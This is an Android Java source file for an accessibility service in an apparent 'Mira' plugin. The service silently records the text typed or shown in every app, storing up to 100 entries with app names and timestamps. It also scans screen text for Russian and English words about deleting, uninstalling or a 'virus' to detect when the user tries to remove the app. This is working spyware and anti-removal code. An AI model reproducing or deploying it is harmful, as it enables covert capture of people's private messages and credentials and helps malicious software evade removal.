package com.mira.plugin;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

public class MiraAccessibilityService extends AccessibilityService {

    private static final String TAG = "MiraAccessibility";
    private static final List<String> capturedTexts = new ArrayList<>();
    private static final int MAX_TEXTS = 100;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int eventType = event.getEventType();
            String packageName = event.getPackageName() != null
                ? event.getPackageName().toString() : "";

            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

                CharSequence text = event.getText().isEmpty() ? null : event.getText().get(0);
                if (text != null && text.length() > 3) {
                    String entry = packageName + "|||" + text.toString()
                        + "|||" + System.currentTimeMillis();
                    synchronized (capturedTexts) {
                        capturedTexts.add(0, entry);
                        if (capturedTexts.size() > MAX_TEXTS) {
                            capturedTexts.remove(capturedTexts.size() - 1);
                        }
                    }
                }
            }

            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : event.getText()) { if (cs != null) sb.append(cs); }
                if (text_contains_delete_intent(sb.toString())) {
                    Log.d(TAG, "Delete intent detected in: " + packageName);
                    synchronized (capturedTexts) {
                        capturedTexts.add(0, "INTENT:delete|||" + packageName
                            + "|||" + System.currentTimeMillis());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent: " + e.getMessage());
        }
    }

    private boolean text_contains_delete_intent(String text) {
        if (text == null) return false;
        String lower = text.toLowerCase();
        String[] triggers = {"удал", "uninstall", "remove", "мира", "mira",
            "приложение", "страшн", "вирус"};
        for (String t : triggers) {
            if (lower.contains(t)) return true;
        }
        return false;
    }

    @Override
    public void onInterrupt() {}

    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
            AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "Accessibility service connected");
    }

    public static List<String> getCapturedTexts() {
        synchronized (capturedTexts) {
            return new ArrayList<>(capturedTexts);
        }
    }

    public static String getLastDeleteIntent() {
        synchronized (capturedTexts) {
            for (String entry : capturedTexts) {
                if (entry.startsWith("INTENT:delete")) {
                    String[] parts = entry.split("\\|\\|\\|");
                    return parts.length > 1 ? parts[1] : "unknown";
                }
            }
        }
        return "";
    }
}
